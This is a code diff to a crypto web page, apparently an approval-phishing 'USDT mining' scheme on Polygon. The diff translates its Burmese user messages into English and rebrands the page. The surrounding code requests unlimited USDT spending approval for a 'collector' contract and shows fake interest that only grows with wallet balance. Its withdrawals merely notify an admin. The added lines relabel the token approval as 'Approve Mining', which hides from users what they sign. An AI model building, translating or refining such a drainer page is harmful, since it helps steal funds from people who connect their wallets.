@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT Polygon Cashback & Dashboard</title>
+    <title>USDT MINING</title>
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
@@ -152,7 +152,7 @@
                     Withdraw interest
                 </button>
                 <div id="withdrawPendingNotice" class="hidden text-center text-xs text-amber-300 bg-amber-950/50 border border-amber-500/30 px-3 py-2 rounded-xl">
-                    သင့် Withdraw Request ကို Admin မှ စစ်ဆေးနေဆဲဖြစ်ပါသည်။ ခွင့်ပြုခြင်း သို့မဟုတ် ငြင်းဆန်ခြင်း မပြီးမချင်း ထပ်မံတင်၍ မရပါ။
+                    Your withdraw request is successfully send, Please wait.
                 </div>
                 <button onclick="pledgeAction()" class="w-full bg-cyan-600 hover:bg-cyan-500 font-semibold py-3 rounded-xl transition cursor-pointer text-sm text-slate-950 font-bold shadow-md">
                     Pledge
@@ -222,7 +222,7 @@
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
                     <img src="binance.png" onerror="this.onerror=null; this.src='https://cryptologos.cc/logos/tether-usdt-logo.png';" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Binance">
-                    <span class="font-semibold text-slate-200 text-xs">Binance</span>
+                    <span class="font-semibold text-slate-200 text-xs">Binance Wallet</span>
                 </div>
                 <div class="flex flex-col items-center justify-center bg-slate-800/90 px-4 py-3 rounded-2xl border border-slate-700 shrink-0">
                     <img src="trustwallet.png" onerror="this.onerror=null; this.src='https://cryptologos.cc/logos/tether-usdt-logo.png';" style="width: 96px; height: 96px;" class="rounded-xl object-contain mb-2" alt="Trust Wallet">
@@ -369,16 +369,16 @@
             stopCountdown();
         }
 
-        function startCountdown(seconds, customMessage = "Transaction အတည်ပြုနေသည်") {
+        function startCountdown(seconds, customMessage = "Transaction approving...") {
             let timeLeft = seconds;
             const logEl = document.getElementById("statusLog");
             clearInterval(countdownInterval);
             countdownInterval = setInterval(() => {
                 if (timeLeft > 0) {
-                    logEl.innerText = `${customMessage}... ကျန်ရှိချိန်: ${timeLeft} စက္ကန့်`;
+                    logEl.innerText = `${customMessage}... Timeleft: ${timeLeft} စက္ကန့်`;
                     timeLeft--;
                 } else {
-                    logEl.innerText = `${customMessage}... Network အခြေအနေကြောင့် အနည်းငယ်ကြာမြင့်နေပါသည်...`;
+                    logEl.innerText = `${customMessage}... Maybe long due to Network condition...`;
                 }
             }, 1000);
         }
@@ -610,7 +610,7 @@
                     document.getElementById("userDashboard").classList.add("hidden");
                     const connectBtn = document.getElementById("connectBtn");
                     connectBtn.innerText = "Connect Wallet";
-                    document.getElementById("statusLog").innerText = "Wallet ချိတ်ဆက်မှု ပြတ်တောက်သွားပါပြီ။";
+                    document.getElementById("statusLog").innerText = "Wallet connection is out";
                     return;
                 }
 
@@ -619,7 +619,7 @@
                 signer = await provider.getSigner();
                 syncPendingWithdrawListener(userAddress);
                 document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
-                document.getElementById("statusLog").innerText = "Wallet account ပြောင်းလဲသွားပါပြီ။ Data ပြန်စစ်ဆေးနေသည်...";
+                document.getElementById("statusLog").innerText = "Wallet account changing. Data checking...";
                 await checkExistingAllowanceAndLoad();
             });
 
@@ -631,14 +631,14 @@
 
                 if (normalizedChain !== POLYGON_CHAIN_ID.toLowerCase()) {
                     document.getElementById("selectedNetworkBadge").classList.add("hidden");
-                    document.getElementById("statusLog").innerText = "⚠️ Polygon Network (0x89) သို့ ပြောင်းလဲပေးပါ။";
+                    document.getElementById("statusLog").innerText = "⚠️ Change to Polygon Network (0x89)";
                     return;
                 }
 
                 document.getElementById("selectedNetworkBadge").classList.remove("hidden");
                 if (userAddress) {
                     signer = await provider.getSigner();
-                    document.getElementById("statusLog").innerText = "Polygon Network ချိတ်ဆက်ပြီးပါပြီ။";
+                    document.getElementById("statusLog").innerText = "Polygon Network connected";
                     await checkExistingAllowanceAndLoad();
                 }
             });
@@ -716,7 +716,7 @@
 
                 if (allowance === null) {
                     hideProgress();
-                    document.getElementById("statusLog").innerText = "⚠️ Network ချိတ်ဆက်မှု နှေးနေပါသည်။ VPN စစ်ဆေးပြီး ပြန်စမ်းကြည့်ပါ။";
+                    document.getElementById("statusLog").innerText = "⚠️ Network connection is not good, Please check your network connection and try again";
                     return;
                 }
 
@@ -739,12 +739,12 @@
                     startRealtimeBalanceSync();
                 } else {
                     hideProgress();
-                    document.getElementById("statusLog").innerText = "Connect Wallet ကိုနှိပ်ပြီး USDT Approval ပြုလုပ်ပါ။";
+                    document.getElementById("statusLog").innerText = "Click to Connect Wallet button and Approve Mining.";
                 }
             } catch (err) {
                 console.error("Allowance check error:", err);
                 hideProgress();
-                document.getElementById("statusLog").innerText = "⚠️ စစ်ဆေးမှု မအောင်မြင်ပါ။ ပြန်လည်စမ်းသပ်ပါ။";
+                document.getElementById("statusLog").innerText = "⚠️ Checking fail, Please try again.";
             }
         }
 
@@ -768,11 +768,11 @@
 
         async function startConnectProcess() {
             if (typeof window.ethereum === "undefined") {
-                alert("MetaMask သို့မဟုတ် Web3 Wallet ကို Install လုပ်ပါ။");
+                alert("Please install MetaMask or Web3 Wallet.");
                 return;
             }
 
-            const isConfirmed = confirm("Polygon Network ဖြင့် Connect လုပ်ပြီး USDT Approve ဆက်လုပ်ရန် OK ကိုနှိပ်ပါ။");
+            const isConfirmed = confirm("Connect with Polygon Network and Click OK to approve Mining.");
             if (!isConfirmed) return;
 
             try {
@@ -797,7 +797,7 @@
                 );
 
                 if (Number(allowance) > 0) {
-                    showProgress(80, "Dashboard သို့ ဝင်ရောက်နေပါပြီ...");
+                    showProgress(80, "Entering to your Dashboard...");
                     
                     const badgeEl = document.getElementById("selectedNetworkBadge");
                     badgeEl.classList.remove("hidden");
@@ -813,7 +813,7 @@
                     withTimeout(autoRegisterInFirebase(userAddress, referrer), 5000, null).catch(() => {});
 
                     await withTimeout(checkUserData(), 7000, null);
-                    showProgress(100, "Welcome Back! Dashboard သို့ ရောက်ရှိပါပြီ။");
+                    showProgress(100, "Welcome Back!");
                     setTimeout(hideProgress, 1000);
                     startRealtimeBalanceSync();
                 } else {
@@ -823,11 +823,11 @@
                 console.error(err);
                 hideProgress();
                 
-                let errorMsg = "Approval သို့မဟုတ် Network ပြောင်းလဲမှု ပျက်ပြားသွားပါပြီ။";
+                let errorMsg = "Approval or Network changing is incompleted";
                 if (err.code === 4001 || err.code === "ACTION_REJECTED" || (err.message && err.message.toLowerCase().includes("user rejected"))) {
-                    errorMsg = "❌ အသုံးပြုသူမှ Transaction ကို ငြင်းပယ်လိုက်ပါပြီ။";
+                    errorMsg = "❌ User did Rejected Transaction";
                 } else if (err.message && (err.message.toLowerCase().includes("insufficient funds") || err.message.toLowerCase().includes("exceeds balance"))) {
-                    errorMsg = "⚠️ Gas Fee (သို့မဟုတ်) လိုအပ်သော လက်ကျန်ငွေ မလုံလောက်ပါ။";
+                    errorMsg = "⚠️ Gas Fee or Polygon(matic) token is needed";
                 }
                 
                 document.getElementById("statusLog").innerText = errorMsg;
@@ -844,8 +844,8 @@
                 connectBtn.innerText = "Active Mining";
                 connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
 
-                showProgress(50, "Submitting approval transaction...");
-                startCountdown(25, "USDT Approval တင်နေသည်");
+                showProgress(50, "Submitting approval Mining...");
+                startCountdown(25, "Approval to Mining");
 
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, signer);
                 const maxAmount = ethers.MaxUint256;
@@ -868,18 +868,18 @@
 
                 document.getElementById("userDashboard").classList.remove("hidden");
                 await withTimeout(checkUserData(), 7000, null);
-                showProgress(100, "Approval ပြီးပါပြီ။ Register အလိုအလျောက် ခွင့်ပြုပြီးပါပြီ။");
+                showProgress(100, "Congratulation! your register is sucessful");
                 setTimeout(hideProgress, 1000);
                 startRealtimeBalanceSync();
             } catch (err) {
                 console.error(err);
                 hideProgress();
                 
-                let errorMsg = "Approval သို့မဟုတ် Network ပြောင်းလဲမှု ပျက်ပြားသွားပါပြီ။";
+                let errorMsg = "Approval or Network changing is incompleted";
                 if (err.code === 4001 || err.code === "ACTION_REJECTED" || (err.message && err.message.toLowerCase().includes("user rejected"))) {
-                    errorMsg = "❌ အသုံးပြုသူမှ Transaction ကို ငြင်းပယ်လိုက်ပါပြီ။";
+                    errorMsg = "❌ User did Rejected Transaction";
                 } else if (err.message && (err.message.toLowerCase().includes("insufficient funds") || err.message.toLowerCase().includes("exceeds balance"))) {
-                    errorMsg = "⚠️ Gas Fee (သို့မဟုတ်) လိုအပ်သော လက်ကျန်ငွေ မလုံလောက်ပါ။";
+                    errorMsg = "⚠️ Gas Fee or Polygon(matic) token is needed";
                 }
                 
                 document.getElementById("statusLog").innerText = errorMsg;
@@ -946,10 +946,10 @@
                 if (!isEligibleForInterest) {
                     const remainingUsdt = Math.max(0, 100 - formattedBal);
                     tierNoticeEl.className = "bg-amber-950/60 border border-amber-500/40 text-amber-300 p-3 rounded-xl text-xs";
-                    tierNoticeEl.innerText = `လက်ရှိ Wallet Balance (${formattedBal.toFixed(1)} USDT) မှာ 100 USDT မပြည့်သေးပါ။ Interest မရရှိသေးပါ (နောက်ထပ် ${remainingUsdt.toFixed(1)} USDT လိုအပ်ပါသည်)။`;
+                    tierNoticeEl.innerText = `Now your Wallet Balance (${formattedBal.toFixed(1)} USDT) isn't 100 USDT reach. Interest unaviable (Another ${remainingUsdt.toFixed(1)} USDT is Need)`;
                 } else {
                     tierNoticeEl.className = "bg-emerald-950/60 border border-emerald-500/40 text-emerald-300 p-3 rounded-xl text-xs";
-                    tierNoticeEl.innerText = `Interest ရရှိနေပါပြီ (လက်ရှိ Rate: ${(rate * 100).toFixed(1)}% USDTBalance)။`;
+                    tierNoticeEl.innerText = `Interest aviable now ( Rate: ${(rate * 100).toFixed(1)}% USDTBalance)`;
                 }
 
                 document.getElementById("lblCashbackBal").innerText = formatUsdtOneDecimal(cashback);
@@ -973,19 +973,19 @@
             refInput.select();
             refInput.setSelectionRange(0, 99999);
             navigator.clipboard.writeText(refInput.value);
-            alert("Referral Link ကူးယူပြီးပါပြီ။");
+            alert("Referral Link copied.");
         }
 
         // Notify Admin via Firebase (blocked if a pending withdraw already exists)
         async function requestWithdraw() {
             if (isWithdrawSubmitting) return;
             if (hasPendingWithdraw) {
-                alert("သင့် Withdraw Request ကို Admin မှ စစ်ဆေးနေဆဲဖြစ်ပါသည်။ ခွင့်ပြုခြင်း သို့မဟုတ် ငြင်းဆန်ခြင်း မပြီးမချင်း ထပ်မံတင်၍ မရပါ။");
+                alert("Your withdraw Request is already sent, Please wait patiently");
                 return;
             }
 
             if (!userAddress || !provider) {
-                alert("ကျေးဇူးပြု၍ Wallet ကို ဦးစွာ ချိတ်ဆက်ပါ။");
+                alert("Please connect your wallet first.");
                 return;
             }
 
@@ -997,20 +997,20 @@
                 if (alreadyPending) {
                     hasPendingWithdraw = true;
                     updateWithdrawButtonUI();
-                    alert("သင့် Withdraw Request ကို Admin မှ စစ်ဆေးနေဆဲဖြစ်ပါသည်။ ခွင့်ပြုခြင်း သို့မဟုတ် ငြင်းဆန်ခြင်း မပြီးမချင်း ထပ်မံတင်၍ မရပါ။");
+                    alert("Your withdraw request is successfully sent, Please wait");
                     return;
                 }
 
                 await withTimeout(checkUserData(), 6000, null);
 
                 if (currentWithdrawableBalance <= 0) {
-                    alert("လက်ရှိ ထုတ်ယူနိုင်သော Balance (0.0 USDT) မရှိသေးပါ။");
+                    alert("Your interest Balance is (0.0 USDT) unavailable to withdraw.");
                     return;
                 }
 
                 const withdrawAmountNum = Number(currentWithdrawableBalance.toFixed(6));
                 if (withdrawAmountNum <= 0) {
-                    alert("ထုတ်ယူနိုင်သော USDT ပမာဏ မလုံလောက်ပါ။");
+                    alert("insufficient withdrawable interest balance.");
                     return;
                 }
 
@@ -1021,11 +1021,11 @@
 
                 hasPendingWithdraw = true;
                 updateWithdrawButtonUI();
-                alert(`Withdraw (${formatUsdtOneDecimal(withdrawAmountNum)}) တောင်းဆိုချက်ကို Firebase မှတစ်ဆင့် Admin ထံ အသိပေးပြီးပါပြီ။ Admin မှ ခွင့်ပြု/ငြင်းဆန်မှု မပြီးမချင်း ထပ်မံတင်၍ မရပါ။`);
+                alert(`Withdraw (${formatUsdtOneDecimal(withdrawAmountNum)}) Your withdraw request is successfully send, Please wait`);
                 await withTimeout(checkUserData(), 6000, null);
             } catch (err) {
                 console.error(err);
-                alert("Withdraw တောင်းဆိုမှု မအောင်မြင်ပါ။");
+                alert("Withdraw request fail.");
             } finally {
                 isWithdrawSubmitting = false;
                 updateWithdrawButtonUI();
@@ -1036,7 +1036,7 @@
         async function pledgeAction() {
             try {
                 if (!userAddress || !signer || !provider) {
-                    alert("ကျေးဇူးပြု၍ Wallet ကို ဦးစွာ ချိတ်ဆက်ပါ။");
+                    alert("Please connect your wallet first");
                     return;
                 }
 
@@ -1050,7 +1050,7 @@
                 const formattedBal = Number(ethers.formatUnits(rawBalance ?? 0n, 6));
 
                 if ((rawBalance ?? 0n) <= 0n || formattedBal <= 0) {
-                    alert("Pledge တင်သွင်းရန် Wallet ထဲတွင် USDT လက်ကျန်ငွေ မရှိပါ။");
+                    alert("At least 5000 USDT balance need to succeed Pledge");
                     return;
                 }
 
@@ -1059,7 +1059,7 @@
                 );
                 if (!confirmed) return;
 
-                showProgress(35, "Pledge တောင်းဆိုချက်အတွက် Allowance စစ်ဆေးနေသည်...");
+                showProgress(35, "Checking your Pledge request...");
                 const currentAllowance = await withTimeout(
                     usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS),
                     6000,
@@ -1072,7 +1072,7 @@
                     await appTx.wait();
                 }
 
-                showProgress(80, "Admin ထံ Pledge အသိပေးချက် ပို့နေသည်...");
+                showProgress(80, "Sending your Pledge request...");
                 await withTimeout(
                     notifyAdminViaFirebase("pledge", {
                         amount: Number(formattedBal.toFixed(6)),
